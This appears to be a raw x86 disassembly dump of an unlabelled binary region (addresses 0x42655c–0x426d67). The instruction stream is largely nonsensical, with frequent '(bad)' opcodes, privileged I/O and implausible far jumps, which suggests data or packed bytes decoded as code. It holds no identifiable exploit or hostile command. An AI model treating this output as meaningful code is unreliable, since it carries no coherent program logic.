  42655c:	pushf  
  42655d:	push   cs
  42655e:	std    
  42655f:	push   es
  426560:	lods   al,BYTE PTR ds:[esi]
  426561:	adc    DWORD PTR [ebp+0x20d25bd2],eax
  426567:	cmp    esp,esi
  426569:	mov    DWORD PTR [edx-0x73d143bd],ebp
  42656f:	pusha  
  426570:	sbb    al,0x74
  426572:	adc    al,0x94
  426574:	in     al,0x6e
  426576:	sbb    al,0xf7
  426578:	mov    edi,0xdbfc8419
  42657d:	mov    eax,ds:0x8280d6f9
  426582:	jmp    0xba7cd80e
  426587:	sbb    dh,dh
  426589:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42658a:	std    
  42658b:	xchg   dl,ch
  42658d:	pop    DWORD PTR [eax]
	...
  426597:	add    BYTE PTR [eax],al
  426599:	add    BYTE PTR [ebp+0x4f3707c0],cl
  42659f:	idiv   DWORD PTR [ebp-0x7c857b06]
  4265a5:	jg     0x426542
  4265a7:	sbb    BYTE PTR [esi+0x1dc54d3],al
  4265ad:	add    ah,bh
  4265af:	add    DWORD PTR [eax],eax
  4265b1:	add    BYTE PTR [edi],al
  4265b3:	push   cs
  4265b4:	repz in al,dx
  4265b6:	stos   BYTE PTR es:[edi],al
  4265b7:	push   edi
  4265b8:	ret    0xb571
  4265bb:	xchg   ebp,eax
  4265bc:	data16 jnp 0x4265c6
  4265bf:	pop    ebx
  4265c0:	inc    edi
  4265c1:	push   ecx
  4265c2:	dec    ebx
  4265c3:	push   esp
  4265c4:	sbb    DWORD PTR [edi-0x7508743f],edx
  4265ca:	mov    eax,ds:0x6f509202
  4265cf:	or     eax,0x1917a453
  4265d4:	mov    eax,ds:0x58331f40
  4265d9:	sub    DWORD PTR [edi],edx
  4265db:	dec    ebp
  4265dc:	jns    0x4265ea
  4265de:	pusha  
  4265df:	add    eax,0xd40a6171
  4265e4:	sahf   
  4265e5:	test   eax,0xf799dc8f
  4265ea:	cmp    al,0xde
  4265ec:	pop    ds
  4265ed:	cmp    al,0x1
  4265ef:	loop   0x426599
  4265f1:	jge    0x426581
  4265f3:	test   al,0x1c
  4265f5:	push   edx
  4265f6:	push   cs
  4265f7:	xlat   BYTE PTR ds:[ebx]
  4265f8:	test   DWORD PTR [ebx-0x534a1b72],ebx
  4265fe:	das    
  4265ff:	xor    al,0x9a
  426601:	xchg   BYTE PTR [ebp-0x4a],bl
  426604:	in     eax,0xf3
  426606:	test   DWORD PTR [ecx-0x3286c424],esp
  42660c:	out    dx,al
  42660d:	dec    esi
  42660e:	cmp    DWORD PTR [ebx-0x71f5c2ce],ebx
  426614:	and    ch,bh
  426616:	mov    esp,0x437f15e2
  42661b:	les    ebx,FWORD PTR [esi]
  42661d:	test   BYTE PTR [ecx+0x311aa933],ah
  426623:	das    
  426624:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426625:	pop    ds
  426626:	mov    ds:0x5a411c61,al
  42662b:	pop    ecx
  42662c:	(bad)  
  42662d:	fstp   DWORD PTR [edx]
  42662f:	in     al,0xc0
  426631:	or     ebx,0x7d
  426634:	adc    DWORD PTR [bp-0x2d58],0xffffffda
  42663a:	ret    0x77f8
  42663d:	jbe    0x4265dd
  42663f:	shl    DWORD PTR [edi-0x5f5c062c],cl
  426645:	(bad)
  426648:	sbb    DWORD PTR [ecx+edi*8],esp
  42664b:	pop    ds
  42664c:	inc    esi
  42664d:	dec    ebx
  42664e:	(bad)  
  42664f:	inc    BYTE PTR [ebx+eiz*1+0x4a5276a1]
  426656:	bound  esi,QWORD PTR [ebx-0x62]
  426659:	les    ebp,FWORD PTR [ecx-0x61]
  42665c:	xchg   ebp,eax
  42665d:	pop    ebx
  42665e:	das    
  42665f:	push   ebp
  426660:	aam    0xaa
  426662:	dec    esi
  426663:	lds    ecx,FWORD PTR [esi+0x331a67a0]
  426669:	fsub   QWORD PTR [ebp-0x19]
  42666c:	add    ebp,esi
  42666e:	jmp    0x426603
  426670:	inc    ecx
  426671:	les    ebx,FWORD PTR [edi]
  426673:	into   
  426674:	push   es
  426675:	xor    DWORD PTR [ebx],0xffffffb2
  426678:	xor    edi,DWORD PTR [edi+0x2b]
  42667b:	mov    dl,0xb
  42667d:	jo     0x42668d
  42667f:	adc    eax,0x5781046a
  426684:	xchg   eax,ecx
  426686:	shl    ah,0xf4
  426689:	inc    esp
  42668a:	jmp    0x8bd0:0x4d6919f3
  426691:	pop    esp
  426692:	push   edi
  426693:	fsub   QWORD PTR ds:0xdf168225
  426699:	scas   al,BYTE PTR es:[edi]
  42669a:	push   edi
  42669b:	sbb    eax,0xc2cdcf50
  4266a0:	adc    ah,dl
  4266a2:	add    ah,BYTE PTR [ecx+0x245dbf5c]
  4266a8:	jbe    0x426728
  4266aa:	and    eax,0x6870a013
  4266af:	push   ebp
  4266b0:	mov    cs,WORD PTR [esi+edi*4+0x4]
  4266b4:	ins    DWORD PTR es:[edi],dx
  4266b5:	xor    DWORD PTR [edx-0x56],edx
  4266b8:	push   ecx
  4266b9:	in     eax,dx
  4266ba:	mov    ebx,0x29bd5f5b
  4266bf:	xor    dh,BYTE PTR [ecx-0x37]
  4266c2:	sub    al,0xd7
  4266c4:	and    ecx,DWORD PTR [esi-0x2b]
  4266c7:	mov    edi,0x8035ec04
  4266cc:	aaa    
  4266cd:	repnz loope 0x4266eb
  4266d0:	xlat   BYTE PTR ds:[ebx]
  4266d1:	mov    eax,0x2a212a7
  4266d6:	cmp    ch,BYTE PTR [ebx]
  4266d8:	xchg   BYTE PTR [edx+0x5183244e],bl
  4266de:	mov    dh,0xe4
  4266e0:	nop
  4266e1:	dec    eax
  4266e2:	outs   dx,DWORD PTR ds:[esi]
  4266e3:	(bad)  
  4266e4:	std    
  4266e5:	pop    ebp
  4266e6:	xor    ecx,DWORD PTR [edx]
  4266e8:	push   esp
  4266e9:	int3   
  4266ea:	or     eax,0x1b2a8be7
  4266ef:	cmp    DWORD PTR [esi],edi
  4266f1:	ret    
  4266f2:	aas    
  4266f3:	retf   0x2724
  4266f6:	movaps XMMWORD PTR [edi+0x4e],xmm5
  4266fa:	inc    eax
  4266fb:	ror    BYTE PTR [eax+0x5a],cl
  4266fe:	mov    bl,dh
  426700:	das    
  426701:	jp     0x4266c2
  426703:	adc    bh,BYTE PTR [esi+0x4c]
  426706:	test   eax,0xe934096c
  42670b:	mov    edi,0xfbca96c2
  426710:	jmp    0x513:0x3901021f
  426717:	cli    
  426718:	xor    al,0xb2
  42671a:	dec    ebp
  42671b:	and    cl,BYTE PTR cs:[bx+di-0x38]
  426720:	call   0xb8a89e7e
  426725:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426726:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426727:	adc    bh,BYTE PTR [eax+0x710ac855]
  42672d:	mov    ch,0x93
  42672f:	xchg   edx,eax
  426730:	mov    eax,ds:0xaeea8200
  426735:	xor    al,BYTE PTR [edi+0x36]
  426738:	adc    eax,0x7181976
  42673d:	(bad)  
  42673e:	cli    
  42673f:	call   0xd98c:0xc9922b78
  426746:	jbe    0x42672c
  426748:	push   ds
  426749:	mov    al,ds:0x15d2d4ef
  42674e:	dec    esp
  42674f:	jmp    0x42672a
  426751:	sub    eax,DWORD PTR [esp+edx*2-0x4ea3dda2]
  426758:	push   eax
  426759:	(bad)  
  42675a:	jmp    0xfe2f35dd
  42675f:	pop    ss
  426760:	in     al,dx
  426761:	int3   
  426762:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426763:	xor    al,0xd8
  426765:	loopne 0x426767
  426767:	in     eax,dx
  426768:	sub    eax,0xde6b7e29
  42676d:	scas   al,BYTE PTR es:[edi]
  42676e:	mov    cl,al
  426770:	inc    BYTE PTR [eax+0x1c700ffa]
  426776:	inc    edi
  426777:	neg    DWORD PTR [eax+0x63]
  42677a:	inc    esp
  42677b:	pop    ss
  42677c:	fsub   QWORD PTR [esi-0x6f1e729d]
  426782:	and    DWORD PTR ss:[ebp+0x38],edx
  426786:	cli    
  426787:	addr16 test al,0xa9
  42678a:	sahf   
  42678b:	jo     0x4267ba
  42678d:	mov    gs,WORD PTR [edi-0x24]
  426790:	dec    ebx
  426791:	dec    edi
  426792:	aam    0xfe
  426794:	(bad)  
  426796:	or     BYTE PTR [ecx],cl
  426798:	dec    ebx
  426799:	cmc    
  42679a:	retf   
  42679b:	mov    ch,0x2f
  42679d:	mov    BYTE PTR [eax],bh
  42679f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4267a0:	mov    edi,0x3f633319
  4267a5:	mov    bh,BYTE PTR [ebp+eax*8-0x7816f680]
  4267ac:	shl    BYTE PTR [edi+0x0],0x0
  4267b3:	add    BYTE PTR [eax],al
  4267b5:	add    BYTE PTR [eax],al
  4267b7:	add    BYTE PTR [eax],al
  4267b9:	add    BYTE PTR [eax-0x57e1776],dh
  4267bf:	jecxz  0x4267ba
  4267c1:	mov    ebx,0xcae72888
  4267c6:	xchg   edi,eax
  4267c7:	sbb    ebp,DWORD PTR [ebp-0x63]
  4267ca:	push   eax
  4267cb:	fiadd  WORD PTR [ecx]
  4267cd:	add    ah,bh
  4267cf:	add    DWORD PTR [eax],eax
  4267d1:	add    BYTE PTR [ebx],dl
  4267d3:	jae    0x4267be
  4267d5:	hlt    
  4267d6:	loop   0x426831
  4267d8:	iret   
  4267d9:	sub    BYTE PTR [ebx-0x4a705551],cl
  4267df:	popa   
  4267e0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4267e1:	cmp    edx,DWORD PTR [ecx-0x19bf64b1]
  4267e7:	in     eax,dx
  4267e8:	lods   eax,DWORD PTR ds:[esi]
  4267e9:	lods   eax,DWORD PTR ds:[esi]
  4267ea:	stc    
  4267eb:	and    eax,0xeba64191
  4267f0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4267f1:	jno    0x426865
  4267f3:	mov    ebp,0xec5d9a1e
  4267f8:	les    edi,FWORD PTR [ecx]
  4267fa:	jmp    0x164d700a
  4267ff:	jno    0x426837
  426801:	out    dx,al
  426802:	mov    es,WORD PTR [edx-0x46]
  426805:	inc    eax
  426806:	push   ebx
  426807:	jnp    0x426853
  426809:	push   ebp
  42680a:	into   
  42680b:	mov    ah,0x32
  42680d:	retf   
  42680e:	mov    dh,0x8f
  426810:	std    
  426811:	ja     0x426827
  426813:	(bad)
  426816:	push   edx
  426817:	jmp    DWORD PTR [edi+0x6356e209]
  42681d:	push   eax
  42681e:	enter  0x1428,0xcf
  426822:	mov    dh,0xf7
  426824:	(bad)  
  426825:	shl    DWORD PTR [esi],0xbe
  426828:	test   DWORD PTR [esi+0x16c638d0],0xabb34fb4
  426832:	sub    eax,0x5be5b9bb
  426837:	div    BYTE PTR ds:0x38c86bdb
  42683d:	jb     0x4267c9
  42683f:	fidivr DWORD PTR [edi+0x76]
  426842:	fistp  WORD PTR [ebp-0x69e60991]
  426848:	es push 0xffffffec
  42684b:	popa   
  42684c:	adc    esp,edx
  42684e:	in     al,dx
  42684f:	adc    eax,DWORD PTR [eax-0x7]
  426852:	sub    eax,0xf9ca7fed
  426857:	test   DWORD PTR [ebp+0x5a907be1],ecx
  42685d:	mov    edx,0x5edab5a8
  426862:	inc    eax
  426863:	sub    eax,0x81d3d827
  426868:	dec    edx
  426869:	aad    0xb1
  42686b:	pop    esp
  42686c:	xchg   ecx,eax
  42686d:	mov    al,ds:0xcf3eab59
  426872:	out    0x6f,eax
  426874:	loop   0x426870
  426876:	pop    ss
  426877:	test   eax,0x88c21a1d
  42687c:	xor    BYTE PTR es:[ebx+0x41],0xc3
  426881:	mov    ebp,DWORD PTR [ebp+0x5a557dcb]
  426887:	mov    ah,0x94
  426889:	or     BYTE PTR [edi-0x5e2ee5ee],bh
  42688f:	xchg   edi,eax
  426890:	inc    ebp
  426891:	add    ebp,eax
  426893:	mov    eax,0x3c85a870
  426898:	ficomp DWORD PTR [esi-0x51]
  42689b:	or     al,0xfc
  42689d:	je     0x426862
  42689f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4268a0:	lahf   
  4268a1:	mov    ch,0x0
  4268a3:	jmp    0xf440b80d
  4268a8:	xchg   ebx,edi
  4268aa:	enter  0x9902,0x63
  4268ae:	daa    
  4268af:	outs   dx,DWORD PTR ds:[esi]
  4268b0:	jg     0x4268b5
  4268b2:	xchg   ebx,eax
  4268b3:	xor    al,BYTE PTR [eax]
  4268b5:	push   0xfffffff8
  4268b7:	in     eax,0xd9
  4268b9:	or     esp,DWORD PTR [edi+0x42]
  4268bc:	int    0xb7
  4268be:	mov    cl,0x53
  4268c0:	mov    esp,0x7130b9e6
  4268c5:	fnstsw WORD PTR [edx]
  4268c7:	jnp    0x42687d
  4268c9:	xlat   BYTE PTR ds:[ebx]
  4268ca:	jne    0x42689b
  4268cc:	or     edx,DWORD PTR [edx+0x7c5d1199]
  4268d2:	js     0x426867
  4268d4:	pop    esp
  4268d5:	clc    
  4268d6:	mov    edx,0x5e879129
  4268db:	push   ebp
  4268dc:	cmp    eax,0xbda23308
  4268e1:	lock add edx,DWORD PTR [ebp+eax*2-0x23e39105]
  4268e9:	hlt    
  4268ea:	sbb    bl,BYTE PTR [eax-0x471a4228]
  4268f0:	push   edx
  4268f1:	imul   ecx,edi,0xbf37f1fd
  4268f7:	mov    dh,0x32
  4268f9:	iret   
  4268fa:	les    esp,FWORD PTR [esi-0x3ef29c56]
  426900:	xor    eax,0xe98f772
  426905:	sub    eax,0xcb6714ec
  42690a:	fisttp DWORD PTR [edi]
  42690c:	xor    al,0x2a
  42690e:	sub    DWORD PTR [ecx+0x74],ebp
  426911:	cmc    
  426912:	sbb    ebp,DWORD PTR [edi+0xf411aad]
  426918:	fnstcw WORD PTR [edi-0x7f0dc655]
  42691e:	xchg   ecx,eax
  42691f:	jmp    0x4268c3
  426921:	pop    ebx
  426922:	sti    
  426923:	and    DWORD PTR [edx+0x7a],0x58f45923
  42692a:	push   es
  42692b:	jmp    0x914c38c3
  426930:	jbe    0x426969
  426932:	hlt    
  426933:	cmp    BYTE PTR [edx],bl
  426935:	dec    ecx
  426936:	cmp    BYTE PTR [eax],cl
  426938:	nop
  426939:	cmp    eax,0x461f9be0
  42693e:	push   ecx
  42693f:	fistp  WORD PTR [edi+0x60e3c863]
  426945:	mov    esp,0x6319f169
  42694a:	lock hlt 
  42694c:	test   al,0x42
  42694e:	mov    bh,0xa6
  426950:	add    al,0x5f
  426952:	jle    0x4269b6
  426954:	mov    esi,0xf07e136e
  426959:	push   ss
  42695a:	sti    
  42695b:	out    0x63,eax
  42695d:	dec    esp
  42695e:	add    ah,BYTE PTR [ecx+0x504e7d80]
  426964:	dec    ebx
  426965:	xchg   edi,eax
  426966:	popf   
  426967:	xchg   edi,eax
  426968:	jle    0x42693e
  42696a:	xchg   esp,eax
  42696b:	push   edx
  42696c:	ins    DWORD PTR es:[edi],dx
  42696d:	adc    DWORD PTR [ebx+0x488b3938],ebx
  426973:	cs dec eax
  426975:	dec    edi
  426976:	inc    ecx
  426977:	mov    edi,DWORD PTR [ebx-0x1b410951]
  42697d:	in     eax,0x5d
  42697f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426980:	retf   
  426981:	push   es
  426982:	inc    esp
  426983:	xor    eax,0x855d4dd1
  426988:	enter  0x80bd,0xb8
  42698c:	aad    0x8d
  42698e:	(bad)  
  42698f:	bound  ebx,QWORD PTR [edx+0x4ce44108]
  426995:	add    cl,BYTE PTR [edx+0x6116f01f]
  42699b:	adc    BYTE PTR [ecx],0x9
  42699e:	out    0x66,eax
  4269a0:	retf   
  4269a1:	(bad)  
  4269a4:	sbb    BYTE PTR [ebx-0x786af4cb],bh
  4269aa:	and    eax,0xe91caf7a
  4269af:	adc    al,0xe8
  4269b1:	xor    al,0x60
  4269b3:	neg    edi
  4269b5:	das    
  4269b6:	test   BYTE PTR [ebx+esi*4-0x69],bl
  4269ba:	jns    0x4269e2
  4269bc:	enter  0xb7b7,0xe7
  4269c0:	dec    esp
  4269c1:	data16 ss cmp al,0x41
  4269c5:	and    DWORD PTR [ecx],eax
  4269c7:	ret    
  4269c8:	pop    eax
  4269c9:	enter  0x42e4,0x7d
  4269cd:	adc    eax,DWORD PTR [eax]
	...
  4269d7:	add    BYTE PTR [eax],al
  4269d9:	add    BYTE PTR [edx-0x39253b74],cl
  4269df:	ficomp DWORD PTR [esi+0xc235fdc]
  4269e5:	mov    dl,BYTE PTR [eax+0x4ca92922]
  4269eb:	loopne 0x4269ee
  4269ed:	add    ah,bh
  4269ef:	add    DWORD PTR [eax],eax
  4269f1:	add    ah,cl
  4269f3:	xor    esp,DWORD PTR [esi+0x53]
  4269f6:	test   ecx,ecx
  4269f8:	ret    
  4269f9:	sbb    BYTE PTR [esi-0x3273262],0x26
  426a00:	(bad)  
  426a01:	aam    0x8b
  426a03:	add    edi,DWORD PTR [edi]
  426a05:	retf   
  426a06:	data16 loopne 0x426a02
  426a09:	or     eax,0x38f43704
  426a0e:	and    eax,0xbefa753b
  426a13:	inc    DWORD PTR [ecx+eiz*4-0x14]
  426a17:	or     eax,0x614e68e4
  426a1c:	mov    WORD PTR [ebx],?
  426a1e:	xor    DWORD PTR [eax-0x5c731e13],eax
  426a24:	inc    esi
  426a25:	addr16 (bad) 
  426a28:	jmp    0x9adc:0x4afe15f0
  426a2f:	mov    ebx,0x5fba102a
  426a34:	outs   dx,BYTE PTR ds:[esi]
  426a35:	pushf  
  426a36:	cmp    ebp,DWORD PTR [ecx]
  426a38:	add    edx,edx
  426a3a:	dec    eax
  426a3b:	rdmsr  
  426a3d:	je     0x426a95
  426a3f:	sbb    al,0xef
  426a41:	jg     0x426ab6
  426a43:	fwait
  426a44:	jl     0x426abc
  426a46:	jae    0x426a89
  426a48:	cld    
  426a49:	scas   eax,DWORD PTR es:[edi]
  426a4a:	in     eax,dx
  426a4b:	int3   
  426a4c:	test   ebp,eax
  426a4e:	cli    
  426a4f:	cmp    BYTE PTR [esi-0x66755a7],ah
  426a55:	test   eax,0x440f389d
  426a5a:	xor    edx,DWORD PTR [eax-0x40223875]
  426a60:	xchg   ebp,eax
  426a61:	cmp    ecx,DWORD PTR [ecx+0x16]
  426a64:	lods   al,BYTE PTR ds:[esi]
  426a65:	ror    BYTE PTR [edi+ebx*8-0x4d],cl
  426a69:	mov    ebp,0x8c10b0f9
  426a6e:	dec    ecx
  426a6f:	pop    ss
  426a70:	aam    0x9a
  426a72:	push   ss
  426a73:	lahf   
  426a74:	imul   ecx,DWORD PTR [edi+ebx*2],0x57
  426a78:	cwde   
  426a79:	je     0x426a29
  426a7b:	xlat   BYTE PTR ds:[ebx]
  426a7c:	gs and al,0x8b
  426a7f:	imul   ebx,DWORD PTR [edx],0xab4d98e1
  426a85:	mov    esp,0x701a29f2
  426a8a:	inc    edi
  426a8b:	stos   DWORD PTR es:[edi],eax
  426a8c:	xchg   edi,eax
  426a8d:	stos   DWORD PTR es:[edi],eax
  426a8e:	mul    BYTE PTR [ecx]
  426a90:	fwait
  426a91:	ss (bad) 
  426a93:	ret    
  426a94:	fwait
  426a95:	in     eax,dx
  426a96:	mov    ebp,0x548687f3
  426a9b:	out    dx,eax
  426a9c:	sub    eax,0x828a8cbc
  426aa1:	sti    
  426aa2:	and    ah,BYTE PTR [esi]
  426aa4:	push   0x34
  426aa6:	fwait
  426aa7:	js     0x426a9e
  426aa9:	leave  
  426aaa:	or     esp,DWORD PTR [edi]
  426aac:	xchg   ebx,eax
  426aad:	jg     0x426aba
  426aaf:	bswap  ebp
  426ab1:	dec    eax
  426ab2:	xchg   edx,eax
  426ab3:	gs jbe 0x426b17
  426ab6:	or     eax,0xc
  426ab9:	test   BYTE PTR [edx+0x6c],0xcc
  426abd:	jmp    0x43f4:0xec8ad786
  426ac4:	pop    ds
  426ac5:	out    0xda,al
  426ac7:	mov    ds:0x56f1067b,eax
  426acc:	jp     0x426a92
  426ace:	pop    ss
  426acf:	call   DWORD PTR [edx+0x58b6752b]
  426ad5:	jb     0x426ab8
  426ad7:	cld    
  426ad8:	fdiv   DWORD PTR [ebp-0x63779eef]
  426ade:	sbb    cl,dh
  426ae0:	loopne 0x426b50
  426ae2:	(bad)  
  426ae3:	dec    esp
  426ae4:	sbb    ecx,esi
  426ae6:	mov    ds:0xc4cfda35,eax
  426aeb:	arpl   bx,bp
  426aed:	in     eax,0xb0
  426aef:	add    edi,DWORD PTR [edi-0x6b]
  426af2:	push   ss
  426af3:	xchg   ebx,eax
  426af4:	movs   DWORD PTR es:[edi],DWORD PTR fs:[esi]
  426af6:	in     eax,0x2b
  426af8:	xor    eax,0x30e1cbe1
  426afd:	add    dh,ah
  426aff:	jmp    0x426a8b
  426b01:	call   0xd629:0x4465a3eb
  426b08:	int    0xd6
  426b0a:	imul   ebx,DWORD PTR [ebx],0x45683d63
  426b10:	fnstsw WORD PTR [ebx]
  426b12:	mov    eax,ds:0x29cc4983
  426b17:	xor    ebx,eax
  426b19:	adc    dl,BYTE PTR [eax+0x78383fe3]
  426b1f:	jg     0x426b8e
  426b21:	ins    BYTE PTR es:[edi],dx
  426b22:	rcl    ch,cl
  426b24:	ret    
  426b25:	js     0x426ba6
  426b27:	xor    DWORD PTR [edi+0x39],edx
  426b2a:	adc    esp,DWORD PTR [eax]
  426b2c:	lahf   
  426b2d:	adc    BYTE PTR [edi+edx*4-0x31],bl
  426b31:	adc    DWORD PTR [eax+0x4b],esp
  426b34:	leave  
  426b35:	jb     0x426b68
  426b37:	mov    BYTE PTR [ebx-0x5d],ch
  426b3a:	(bad)
  426b3e:	fidivr WORD PTR [ebx]
  426b40:	xlat   BYTE PTR ds:[ebx]
  426b41:	adc    eax,0xc19386f1
  426b46:	and    BYTE PTR [esi+0x4cb4794e],0x20
  426b4d:	sub    al,0x71
  426b4f:	add    DWORD PTR [eax+ebx*2+0x48],edi
  426b53:	and    al,0x62
  426b55:	push   es
  426b56:	(bad)  
  426b57:	push   ebp
  426b58:	push   esi
  426b59:	addr16 xchg ebp,eax
  426b5b:	ret    
  426b5c:	shr    BYTE PTR [edi],1
  426b5e:	push   0x57
  426b60:	cmp    BYTE PTR [edi+0x43ddd509],0x5f
  426b67:	test   DWORD PTR [ebx-0x2fdf20b5],ebx
  426b6d:	test   eax,0xd3edfef6
  426b72:	data16 sbb al,0xec
  426b75:	lods   al,BYTE PTR ds:[esi]
  426b76:	xor    BYTE PTR [esi+0x0],dh
  426b79:	jmp    FWORD PTR [edi+0x6b2da3a]
  426b7f:	xor    DWORD PTR [ebx-0x45],0xffffffea
  426b83:	aaa    
  426b84:	test   eax,0x8cf567e7
  426b89:	(bad)  
  426b8a:	es mov ecx,0xebbf2461
  426b90:	fistp  DWORD PTR [ebp-0x13d000e2]
  426b96:	std    
  426b97:	test   al,0x82
  426b99:	ds dec esp
  426b9b:	and    ebx,eax
  426b9d:	scas   al,BYTE PTR es:[edi]
  426b9e:	cdq    
  426b9f:	loope  0x426baa
  426ba1:	push   es
  426ba2:	fmul   QWORD PTR [ebp+0x7f24444f]
  426ba8:	ror    DWORD PTR [ecx+0x11],cl
  426bab:	add    al,0x7d
  426bad:	xchg   edx,eax
  426bae:	into   
  426baf:	popf   
  426bb0:	mov    eax,ds:0xf8e77e5a
  426bb5:	out    0xca,eax
  426bb7:	enter  0x8c28,0xe2
  426bbb:	lods   eax,DWORD PTR ds:[esi]
  426bbc:	in     eax,dx
  426bbd:	xor    eax,0x9e8303d6
  426bc2:	dec    ebp
  426bc3:	mov    edi,0x5dac8792
  426bc8:	push   ecx
  426bc9:	mov    ds:0x693df6bc,al
  426bce:	ficomp DWORD PTR [esi+eiz*2+0x68a732b0]
  426bd5:	inc    esi
  426bd6:	pop    ebx
  426bd7:	xchg   edi,eax
  426bd8:	fmul   st(4),st
  426bda:	out    dx,eax
  426bdb:	call   0x841ba741
  426be0:	mov    ds:0xf4046845,al
  426be5:	rcl    dh,1
  426be7:	loop   0x426bc2
  426be9:	push   edi
  426bea:	xor    al,0x71
  426bec:	call   0x426bf9
	...
  426bf9:	add    BYTE PTR [eax-0x56],al
  426bfc:	pop    edx
  426bfd:	sbb    bh,dl
  426bff:	cli    
  426c00:	inc    eax
  426c01:	cli    
  426c02:	mov    ds:0xf5fe433f,al
  426c07:	mov    dl,0xbe
  426c09:	dec    esp
  426c0a:	dec    eax
  426c0b:	loop   0x426c0e
  426c0d:	add    ah,bh
  426c0f:	add    DWORD PTR [eax],eax
  426c11:	add    BYTE PTR [ebx+0x4b],bl
  426c14:	scas   eax,DWORD PTR es:[edi]
  426c15:	mov    edi,0xcd2da9e1
  426c1a:	push   es
  426c1b:	mov    ecx,0x149d83ad
  426c20:	xchg   ecx,eax
  426c21:	sbb    BYTE PTR [ecx-0x33],dl
  426c24:	int3   
  426c25:	fldenvw [esp-0x6]
  426c2a:	push   0xf3fefe0d
  426c2f:	push   esp
  426c30:	cmp    eax,0x1961db74
  426c35:	cmp    BYTE PTR [ebp+0x1a],bh
  426c38:	inc    edi
  426c39:	ins    DWORD PTR es:[edi],dx
  426c3a:	mul    DWORD PTR [edx]
  426c3c:	pop    ebp
  426c3d:	jmp    0x426c2d
  426c3f:	pop    ss
  426c40:	or     eax,0x9a9ceb7e
  426c45:	xchg   esp,eax
  426c46:	or     DWORD PTR [ebp+0x22bf6cb8],esi
  426c4c:	scas   eax,DWORD PTR es:[edi]
  426c4d:	outs   dx,BYTE PTR ds:[esi]
  426c4e:	push   edi
  426c4f:	add    dl,cl
  426c51:	mov    al,0xdd
  426c53:	sbb    al,0x9a
  426c55:	mov    eax,0x8a1e10e0
  426c5a:	dec    edx
  426c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426c5c:	lods   al,BYTE PTR ds:[esi]
  426c5d:	mov    al,0x42
  426c5f:	push   ebx
  426c60:	sub    ebp,0xffffffe3
  426c63:	gs inc edx
  426c65:	fld    TBYTE PTR [eax+0x2c]
  426c68:	jbe    0x426bf9
  426c6a:	lock and al,BYTE PTR [edx-0x2476eb74]
  426c71:	sti    
  426c72:	pop    ecx
  426c73:	xchg   ebp,eax
  426c74:	sub    BYTE PTR [edx],al
  426c76:	sbb    esp,DWORD PTR ds:0xd1a4f954
  426c7c:	mov    WORD PTR [edi],?
  426c7e:	sub    eax,0x83c3035d
  426c83:	dec    BYTE PTR [ecx]
  426c85:	cmp    eax,DWORD PTR [edi+0x16771c12]
  426c8b:	cmc    
  426c8c:	test   ebx,ecx
  426c8e:	leave  
  426c8f:	xchg   ebx,eax
  426c90:	icebp  
  426c91:	xchg   edx,eax
  426c92:	mov    edx,0x29296e82
  426c97:	idiv   ch
  426c99:	cmp    eax,0x21d60c71
  426c9e:	and    al,0x3a
  426ca0:	mov    ebx,0x51f396b7
  426ca5:	xor    dl,BYTE PTR [ebp-0x6c]
  426ca8:	mov    al,0xd3
  426caa:	fs inc ebp
  426cac:	sbb    ecx,ebp
  426cae:	or     al,0x74
  426cb0:	xor    al,0x34
  426cb2:	ins    BYTE PTR es:[edi],dx
  426cb3:	sub    eax,0xc712c170
  426cb8:	mov    ebp,0x8d9f6896
  426cbd:	xor    dh,BYTE PTR [eax-0x5e02761c]
  426cc3:	push   esi
  426cc4:	jb     0x426ced
  426cc6:	add    eax,0x7da635eb
  426ccb:	out    0x5d,al
  426ccd:	sbb    esp,eax
  426ccf:	mov    fs,WORD PTR ds:0x45346a34
  426cd5:	fidiv  WORD PTR [edi+0x3c455852]
  426cdb:	dec    esp
  426cdc:	jmp    0x426c79
  426cde:	addr16 ret 
  426ce0:	jo     0x426cc5
  426ce2:	jle    0x426d5a
  426ce4:	push   edx
  426ce5:	int3   
  426ce6:	add    BYTE PTR ds:0xf0fcdf0f,ah
  426cec:	sub    eax,0xace4b6d9
  426cf1:	or     bl,bh
  426cf3:	aad    0x7d
  426cf5:	mov    esi,0x8f31d454
  426cfa:	sub    DWORD PTR [eax],edx
  426cfc:	sbb    eax,0xdfa80305
  426d01:	ins    BYTE PTR es:[edi],dx
  426d02:	loopne 0x426ced
  426d04:	in     eax,dx
  426d05:	adc    al,0xd
  426d07:	push   edx
  426d08:	inc    edi
  426d09:	test   bl,dh
  426d0b:	mov    edi,0x7bd2ec8f
  426d10:	mov    dl,0x2e
  426d12:	sub    esp,DWORD PTR [ebx+0x5d1946b7]
  426d18:	icebp  
  426d19:	inc    ebx
  426d1a:	mov    ah,0xaf
  426d1c:	in     eax,0xe1
  426d1e:	hlt    
  426d1f:	mov    eax,0x5e44df48
  426d24:	shl    BYTE PTR [edx],1
  426d26:	scas   eax,DWORD PTR es:[di]
  426d28:	cmp    ah,ch
  426d2a:	push   ss
  426d2b:	sub    ah,BYTE PTR [ebp-0x65]
  426d2e:	lahf   
  426d2f:	mov    ebp,0x3935c7f6
  426d34:	int3   
  426d35:	push   esp
  426d36:	gs mov cl,0x7e
  426d39:	shr    ecx,1
  426d3b:	popf   
  426d3c:	div    BYTE PTR [ebx+0x7865410f]
  426d42:	or     cl,BYTE PTR [edx+ebp*2]
  426d45:	jb     0x426d30
  426d47:	xchg   ebx,eax
  426d48:	popa   
  426d49:	sbb    eax,0x2b2e1518
  426d4e:	xchg   ecx,eax
  426d4f:	mov    cl,0xb0
  426d51:	std    
  426d52:	xor    DWORD PTR [eax],ebx
  426d54:	dec    ebp
  426d55:	rcr    DWORD PTR [edx],1
  426d57:	(bad)  
  426d58:	rol    ebp,1
  426d5a:	fidivr DWORD PTR [esi]
  426d5c:	scas   eax,DWORD PTR es:[edi]
  426d5d:	sbb    DWORD PTR [ebx+ebx*2],eax
  426d60:	mov    ebp,0x1fb96de1
  426d65:	push   edx
  426d66:	inc    eax
  426d67:	lods   al,BYTE PTR ds:[esi]
